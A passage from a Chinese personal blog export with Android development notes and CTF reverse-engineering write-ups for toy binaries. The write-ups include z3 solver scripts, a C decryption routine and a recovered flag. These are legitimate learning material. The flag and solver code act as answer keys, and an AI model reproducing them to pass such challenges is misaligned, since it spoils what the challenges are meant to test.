<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">plugins &#123;</span><br><span class="line">    id <span class="string">&#x27;com.android.application&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">android &#123;</span><br><span class="line">    namespace <span class="string">&#x27;com.example.mobilego&#x27;</span></span><br><span class="line">    compileSdk <span class="number">33</span></span><br><span class="line"></span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        applicationId <span class="string">&quot;com.example.mobilego&quot;</span></span><br><span class="line">        minSdk <span class="number">26</span></span><br><span class="line">        targetSdk <span class="number">33</span></span><br><span class="line">        versionCode <span class="number">1</span></span><br><span class="line">        versionName <span class="string">&quot;1.0&quot;</span></span><br><span class="line"></span><br><span class="line">        testInstrumentationRunner <span class="string">&quot;androidx.test.runner.AndroidJUnitRunner&quot;</span></span><br><span class="line">        externalNativeBuild &#123;</span><br><span class="line">            cmake &#123;</span><br><span class="line">                cppFlags <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    buildTypes &#123;</span></span><br><span class="line"><span class="string">        release &#123;</span></span><br><span class="line"><span class="string">            minifyEnabled false</span></span><br><span class="line"><span class="string">            proguardFiles getDefaultProguardFile(&#x27;</span>proguard-android-optimize.txt<span class="number">&#x27;</span>), <span class="string">&#x27;proguard-rules.pro&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    compileOptions &#123;</span><br><span class="line">        sourceCompatibility JavaVersion.VERSION_1_8</span><br><span class="line">        targetCompatibility JavaVersion.VERSION_1_8</span><br><span class="line">    &#125;</span><br><span class="line">    externalNativeBuild &#123;</span><br><span class="line">        cmake &#123;</span><br><span class="line">            path <span class="title function_">file</span><span class="params">(<span class="string">&#x27;src/main/cpp/CMakeLists.txt&#x27;</span>)</span></span><br><span class="line">            version &#x27;3.22.1&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dependencies &#123;</span><br><span class="line"></span><br><span class="line">    implementation <span class="string">&#x27;androidx.appcompat:appcompat:1.6.1&#x27;</span></span><br><span class="line">    implementation <span class="string">&#x27;com.google.android.material:material:1.8.0&#x27;</span></span><br><span class="line">    implementation <span class="string">&#x27;androidx.constraintlayout:constraintlayout:2.1.4&#x27;</span></span><br><span class="line">    testImplementation <span class="string">&#x27;junit:junit:4.13.2&#x27;</span></span><br><span class="line">    androidTestImplementation <span class="string">&#x27;androidx.test.ext:junit:1.1.5&#x27;</span></span><br><span class="line">    androidTestImplementation <span class="string">&#x27;androidx.test.espresso:espresso-core:3.5.1&#x27;</span></span><br><span class="line">    implementation(fileTree(<span class="string">&quot;libs&quot;</span>))<span class="comment">//導入</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>开发</category>
        <category>安卓开发</category>
      </categories>
  </entry>
  <entry>
    <title>golang_jar</title>
    <url>/2024/06/10/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/golang_jar/</url>
    <content><![CDATA[<p>gomobile</p>
]]></content>
      <categories>
        <category>开发</category>
        <category>安卓开发</category>
      </categories>
  </entry>
  <entry>
    <title>native开发</title>
    <url>/2024/06/27/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/native%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[<p>调用步骤</p>
<pre class="mermaid">graph TB;

subgraph init_array
A[手动声明的构造函数]-->B[带自定义类的静态变量]
end
B-->C[JNI_Onload]</pre>

<p>手动声明的构造函数</p>
<p>会自动填充在init_array里，按声明顺序依次排布</p>
<p>声明方法:</p>
<blockquote>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">__attribute__((constructor)) <span class="function"><span class="type">void</span> <span class="title">funcname</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</blockquote>
<p>带自定类的静态变量</p>
<p>如std::string</p>
<p>声明在代码最开头</p>
<blockquote>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> std::string hello=<span class="string">&quot;String from JNI&quot;</span>;</span><br></pre></td></tr></table></figure></div>
</blockquote>
<p>如果是C++原始类型则不会放在init_array内</p>
]]></content>
      <categories>
        <category>开发</category>
        <category>安卓开发</category>
      </categories>
  </entry>
  <entry>
    <title>事件绑定</title>
    <url>/2023/06/21/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/%E4%BA%8B%E4%BB%B6%E7%BB%91%E5%AE%9A/</url>
    <content><![CDATA[<h1 id="Click事件"><a href="#Click事件" class="headerlink" title="Click事件"></a>Click事件</h1><h2 id="获取对应事件按钮的id"><a href="#获取对应事件按钮的id" class="headerlink" title="获取对应事件按钮的id"></a>获取对应事件按钮的id</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> ImageButton imgbutton;</span><br><span class="line">imgbutton=findViewById(R.id.x)<span class="comment">// 此处x为对应的id名</span></span><br></pre></td></tr></table></figure></div>

<h2 id="建立对应事件的监听器"><a href="#建立对应事件的监听器" class="headerlink" title="建立对应事件的监听器"></a>建立对应事件的监听器</h2><p>有两种方法</p>
<h3 id="新建一个类传入一个对Onclick方法的重载"><a href="#新建一个类传入一个对Onclick方法的重载" class="headerlink" title="新建一个类传入一个对Onclick方法的重载"></a>新建一个类传入一个对Onclick方法的重载</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">imgbutton.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="comment">//函数体</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure></div>



<h3 id="直接使用java-lambda函数"><a href="#直接使用java-lambda函数" class="headerlink" title="直接使用java lambda函数"></a>直接使用java lambda函数</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">imgbutton.setOnClickListener( v-&gt;&#123;</span><br><span class="line">    <span class="comment">//函数体</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>

<p>此处v为参数，java可以自动确定其参数类型，也可以自己指定</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">imgbutton.setOnClickListener((View v)-&gt;&#123;</span><br><span class="line">    <span class="comment">//函数体</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>

<p>实际上只需要一个实现了Onclick方法的对象即可，比如mainactivtiy也可以implements View.OnClickListener</p>
]]></content>
      <categories>
        <category>开发</category>
        <category>安卓开发</category>
      </categories>
  </entry>
  <entry>
    <title>组件相关</title>
    <url>/2023/06/21/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/%E7%BB%84%E4%BB%B6%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[<h1 id="约束模式"><a href="#约束模式" class="headerlink" title="约束模式"></a>约束模式</h1><p>约束模式相对于其他模式更加简单，可以直接拖动组件来改变布局。</p>
<p>参考<a class="link"   href="https://developer.android.google.cn/training/constraint-layout?hl=zh-cn" >使用 ConstraintLayout 构建自适应界面  | Android 开发者  | Android Developers (google.cn) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>基本如下</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>其所有元素都是约束在这个框架内的，需要设定相应的长宽</p>
<p>先点击此按钮进行消除对应的约束，不然不能正常移动组件的位置</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306212245063.png"
                      alt="image-20230621224501024"
                ></p>
<p>调整好位置后再点击自动设置约束</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306212243554.png"
                      alt="image-20230621224331514"
                ></p>
<p>基本就是这样就可以调整各个视图组件的位置。</p>
]]></content>
      <categories>
        <category>开发</category>
        <category>安卓开发</category>
      </categories>
  </entry>
  <entry>
    <title>调用已经存在的lib</title>
    <url>/2024/06/11/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/%E8%B0%83%E7%94%A8%E5%B7%B2%E7%BB%8F%E5%AD%98%E5%9C%A8%E7%9A%84lib/</url>
    <content><![CDATA[<p>只</p>
<p>build.gradle</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">plugins &#123;</span><br><span class="line">    id <span class="string">&#x27;com.android.application&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">android &#123;</span><br><span class="line">    namespace <span class="string">&#x27;com.example.challengemobile&#x27;</span></span><br><span class="line">    compileSdk <span class="number">33</span></span><br><span class="line"></span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        applicationId <span class="string">&quot;com.example.challengemobile&quot;</span></span><br><span class="line">        minSdk <span class="number">28</span></span><br><span class="line">        targetSdk <span class="number">33</span></span><br><span class="line">        versionCode <span class="number">1</span></span><br><span class="line">        versionName <span class="string">&quot;1.0&quot;</span></span><br><span class="line"></span><br><span class="line">        testInstrumentationRunner <span class="string">&quot;androidx.test.runner.AndroidJUnitRunner&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buildTypes &#123;</span><br><span class="line">        release &#123;</span><br><span class="line">            minifyEnabled <span class="literal">false</span></span><br><span class="line">            proguardFiles <span class="title function_">getDefaultProguardFile</span><span class="params">(<span class="string">&#x27;proguard-android-optimize.txt&#x27;</span>)</span>, &#x27;proguard-rules.pro&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sourceSets &#123;</span><br><span class="line">        main &#123;<span class="comment">//只需要寫入這個即可</span></span><br><span class="line">            jniLibs.srcDirs = [<span class="string">&#x27;libs&#x27;</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    compileOptions &#123;</span><br><span class="line">        sourceCompatibility JavaVersion.VERSION_1_8</span><br><span class="line">        targetCompatibility JavaVersion.VERSION_1_8</span><br><span class="line">    &#125;</span><br><span class="line">    ndkVersion <span class="string">&#x27;21.3.6528147&#x27;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dependencies &#123;</span><br><span class="line"></span><br><span class="line">    implementation <span class="string">&#x27;androidx.appcompat:appcompat:1.6.1&#x27;</span></span><br><span class="line">    implementation <span class="string">&#x27;com.google.android.material:material:1.8.0&#x27;</span></span><br><span class="line">    implementation <span class="string">&#x27;androidx.constraintlayout:constraintlayout:2.1.4&#x27;</span></span><br><span class="line">    testImplementation <span class="string">&#x27;junit:junit:4.13.2&#x27;</span></span><br><span class="line">    androidTestImplementation <span class="string">&#x27;androidx.test.ext:junit:1.1.5&#x27;</span></span><br><span class="line">    androidTestImplementation <span class="string">&#x27;androidx.test.espresso:espresso-core:3.5.1&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>开发</category>
        <category>安卓开发</category>
      </categories>
  </entry>
  <entry>
    <title>label结构</title>
    <url>/2024/03/05/%E5%BC%80%E5%8F%91/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/label%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<p><a class="link"   href="https://app.roboflow.com/" >手动标签生成数据集 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202403051736569.png"
                      alt="image-20240305173618382"
                ></p>
]]></content>
      <categories>
        <category>开发</category>
        <category>深度学习</category>
      </categories>
  </entry>
  <entry>
    <title>1.elf z3暴力破解·改</title>
    <url>/2023/01/04/CTF%20WP/Re/pythonz3/1.elf%20z3%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%C2%B7%E6%94%B9/</url>
    <content><![CDATA[<p>源代码如下</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">level1</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+Fh] [rbp-81h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-7Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+1Ch] [rbp-74h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+20h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This is level1!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;show me your flag:&quot;</span>);</span><br><span class="line">  input_string(s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) != <span class="number">40</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  v1 = <span class="string">&#x27;\xAB&#x27;</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">39</span>; ++i )<span class="comment">//这个是加密过程 直接原样复制到z3求解器中即可</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">50</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 ^= j ^ v2 ^ <span class="number">0x5F</span>;</span><br><span class="line">      s[i] ^= s[(i + <span class="number">1</span>) % <span class="number">40</span>];</span><br><span class="line">      s[i] ^= v1;</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">39</span>; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[k] != compare_data[k] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Ohhhh, TRY HARD&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Yeah you win!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Yeah you win!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Yeah you win!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Yeah you win!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可通过如下代码</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;前面需要输入条件&quot;</span></span><br><span class="line">f=Solver()</span><br><span class="line"><span class="built_in">print</span>(f.model)</span><br></pre></td></tr></table></figure></div>

<p>可以查找自己所输入的条件<br>通过对z3的检验发现自己出现了个python的低级常识性错误<br>for循环时range输出的可遍历对象实际是小于该对象的<br>如range(10)其应该是&lt;10<br>所以经过对遍历对象的修改<br>真正的z3代码应该如下</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *    </span><br><span class="line">DataCmp=[		</span><br><span class="line"><span class="number">161</span>, <span class="number">186</span>, <span class="number">110</span>, <span class="number">70</span>, <span class="number">128</span>, <span class="number">244</span>, <span class="number">217</span>, <span class="number">170</span>, <span class="number">180</span>, <span class="number">54</span>, <span class="number">90</span>,</span><br><span class="line">   <span class="number">204</span>, <span class="number">140</span>, <span class="number">30</span>, <span class="number">149</span>, <span class="number">33</span>, <span class="number">143</span>, <span class="number">67</span>, <span class="number">225</span>, <span class="number">19</span>, <span class="number">138</span>, <span class="number">168</span>, <span class="number">106</span>,</span><br><span class="line">   <span class="number">66</span>, <span class="number">174</span>, <span class="number">251</span>, <span class="number">247</span>, <span class="number">165</span>, <span class="number">157</span>, <span class="number">11</span>, <span class="number">75</span>, <span class="number">222</span>, <span class="number">186</span>, <span class="number">0</span>, <span class="number">135</span>,</span><br><span class="line">   <span class="number">35</span>, <span class="number">144</span>, <span class="number">70</span>, <span class="number">211</span>, <span class="number">223</span>]<span class="comment">#加密逻辑中最后的校验数组</span></span><br><span class="line">flag = [BitVec(<span class="string">&#x27;flag[%2d]&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]  <span class="comment">#设置8位位向量数组代表原来的flag,这种只是创建数组的快速方式 也可以用for循环创建数组</span></span><br><span class="line">out=[<span class="number">0</span>]*<span class="number">40</span><span class="comment">#out代表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    out[i]=flag[i]<span class="comment">#将out赋值为flag，因为flag是用于保存flag的状态，out用于进行加密变化</span></span><br><span class="line">v1=<span class="number">0xab</span><span class="comment">#添加初始条件</span></span><br><span class="line">v2=<span class="number">0</span><span class="comment">#添加初始条件</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):<span class="comment">#用out进行加密操作，如果用flag进行加密操作 则最后求解求的就不是flag，因为flag变量一直被赋值</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">51</span>):</span><br><span class="line">        v1=(v1^j^v2^<span class="number">0x5f</span>)%<span class="number">256</span></span><br><span class="line">        out[i]^=out[(i+<span class="number">1</span>)%<span class="number">40</span>]</span><br><span class="line">        out[i]^=v1</span><br><span class="line">        v2+=<span class="number">1</span></span><br><span class="line">f = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    f.add(out[i]==DataCmp[i])<span class="comment">#添加条件使变化中的out=校验数组中的值</span></span><br><span class="line"><span class="keyword">while</span>(f.check()==sat):<span class="comment">#z3求解需要先进行check()否则不能直接获得解 sat代表有解 unsat代表没有解</span></span><br><span class="line">    condition = []</span><br><span class="line">    m = f.model()<span class="comment">#获取解的字典(具体格式类似于&#123;flag[0]:123,flag[1]:321&#125;)</span></span><br><span class="line">    p=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        p+=<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[flag[i]])))<span class="comment">#用于访问flag字典(如果i=0则此时获取的是flag[0]的值)因为此处m[flag[i]]不是数字类型，是z3特有的类型，此处先转为&quot;123&quot;再转化为int 123最后转化为123对应的ascii字符</span></span><br><span class="line">        condition.append(flag[i]!=<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[flag[i]])))<span class="comment">#用于添加条件，让下一次结果跟现在的结果不同</span></span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    f.add(Or(condition))<span class="comment">#用于添加条件，让下一次结果跟现在的结果不同</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>此处也可用暴力破解 因为 在for j in range(51)循环内前一个字符只跟后一个字符有关 如果了解了flag前三个字符是SYC也是可以直接破解的</p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>pythonz3</category>
      </categories>
  </entry>
  <entry>
    <title>1.elf</title>
    <url>/2022/12/28/CTF%20WP/Re/pythonz3/1.elf/</url>
    <content><![CDATA[<p>其加密的过程是</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v1 = <span class="number">-85</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">39</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">50</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 ^= j ^ v2 ^ <span class="number">0x5F</span>;</span><br><span class="line">      s[i] ^= s[(i + <span class="number">1</span>) % <span class="number">40</span>];</span><br><span class="line">      s[i] ^= v1;</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>可以直接找到它加密后的字符串</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="E:\note\re\1.elf.assets\image-20221228142654979.png"
                      alt="image-20221228142654979"
                ></p>
<p>可以直接根据加密算法逆推答案</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char s[] = &#123; 161, 186, 110, 70, 128, 244, 217, 170, 180, 54, 90,</span><br><span class="line">   204, 140, 30, 149, 33, 143, 67, 225, 19, 138, 168, 106,</span><br><span class="line">   66, 174, 251, 247, 165, 157, 11, 75, 222, 186, 0, 135,</span><br><span class="line">   35, 144, 70, 211, 223,&#x27;\0&#x27;&#125;;//需补充&#x27;\0&#x27;作为字符串结尾（后续解密不需修改）</span><br><span class="line">    char v1 = -85;</span><br><span class="line">    int v2 = 0;</span><br><span class="line">    v1 = -85;</span><br><span class="line">    v2 = 0;</span><br><span class="line">    int i, j;</span><br><span class="line">   for (i = 0; i &lt;= 39; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        for (j = 0; j &lt;= 50; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            v1 ^= j ^ v2 ^ 0x5F;</span><br><span class="line">            ++v2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;//加密时是从前往后加密，则解密需要从后往前解密，需要求出最后的v1对应的值才能做解密运算</span><br><span class="line">    for (i = 39; i &gt;= 0; --i)</span><br><span class="line">    &#123;</span><br><span class="line">        for (j = 50; j &gt;= 0; --j)</span><br><span class="line">        &#123;</span><br><span class="line">            --v2;</span><br><span class="line">            s[i] ^= v1;</span><br><span class="line">            s[i] ^= s[(i + 1) % 40];</span><br><span class="line">            v1 ^= j ^ v2 ^ 0x5F;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;//将后面的加密顺序调转（包括指令如加密中最后的++v2变为最上方的--v2，异或运算不用变化，只需跟随加密顺序再将顺序逆转就可进行解密运算了</span><br><span class="line">    puts((char *)s);//以字符串输出</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>解出答案就是SYC{bIIngxvJqVDOUqbuiHDpadwfdRePetteyBP}</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">f=Solver()</span><br><span class="line">print(f.model)</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>pythonz3</category>
      </categories>
  </entry>
  <entry>
    <title>2.elf z3暴力破解</title>
    <url>/2023/01/04/CTF%20WP/Re/pythonz3/2.elf%20z3%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<p>通过进行动态调试发现确实</p>
<p>![image-20230104221103045](E:\note\re\pythonz3\2.elf z3暴力破解.assets\image-20230104221103045.png)</p>
<p>此处是进行校验的字符串</p>
<p>但是开始我所理解的顺序不是从左到右而是从低位到高位如图</p>
<p>![image-20230104221209637](E:\note\re\pythonz3\2.elf z3暴力破解.assets\image-20230104221209637.png)</p>
<p>0x04,0x46,0x81,0x63……正是v4从低位到高位的顺序排列的，我又犯了些低级错误。。。。。</p>
<p>所以此处通过z3</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a=[<span class="number">0x4</span>,<span class="number">0x46</span>,<span class="number">0x81</span>,<span class="number">0x63</span>,<span class="number">0x14</span>,</span><br><span class="line"><span class="number">0x53</span>,<span class="number">0x17</span>,<span class="number">0x6d</span>,<span class="number">0x6a</span>,<span class="number">0x67</span>,<span class="number">0x76</span>,<span class="number">0x16</span>,<span class="number">0x34</span>,<span class="number">0x14</span>,</span><br><span class="line"><span class="number">0x34</span>]</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;flag[%2d]&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>)]</span><br><span class="line">out=[<span class="number">0</span>]*<span class="number">14</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    out[i]=flag[i]</span><br><span class="line">v0=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        out[i]^=i^j^<span class="number">0x32</span></span><br><span class="line">        out[i]+=v0</span><br><span class="line">        v0+=<span class="number">1</span></span><br><span class="line">f=Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    f.add(out[i]==a[i])</span><br><span class="line"><span class="keyword">while</span>(f.check()==sat):</span><br><span class="line">    condition = []</span><br><span class="line">    m = f.model()</span><br><span class="line">    p=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">        p+=<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[flag[i]])))</span><br><span class="line">        condition.append(flag[i]!=<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[flag[i]])))</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    f.add(Or(condition))</span><br></pre></td></tr></table></figure></div>

<p>找到了对应的flag（也许？）</p>
<p>![image-20230104221401911](E:\note\re\pythonz3\2.elf z3暴力破解.assets\image-20230104221401911.png)</p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>pythonz3</category>
      </categories>
  </entry>
  <entry>
    <title>3.elf</title>
    <url>/2023/01/04/CTF%20WP/Re/pythonz3/3.elf/</url>
    <content><![CDATA[<p>尝试对3.elf进行动态调试</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="E:\note\re\pythonz3\3.elf.assets\image-20230104222906904.png"
                      alt="image-20230104222906904"
                ></p>
<p>寄，我的glibc库版本低了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="E:\note\re\pythonz3\3.elf.assets\image-20230104223251675.png"
                      alt="image-20230104223251675"
                ></p>
<p>但根据2.elf的经验，其存储顺序应该是按上到下的顺序存储的，从低位到高位存储的</p>
